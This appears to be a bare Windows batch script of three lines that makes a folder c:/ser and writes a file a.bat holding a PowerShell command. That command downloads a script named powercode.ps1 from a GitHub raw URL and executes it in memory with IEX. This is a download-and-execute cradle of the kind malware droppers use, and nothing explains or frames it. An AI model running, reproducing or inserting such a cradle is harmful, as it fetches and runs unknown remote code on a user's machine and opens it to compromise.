md c:/ser
cd c:/ser
echo powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercode.ps1').GetResponse().GetResponseStream()).ReadToEnd());>a.bat
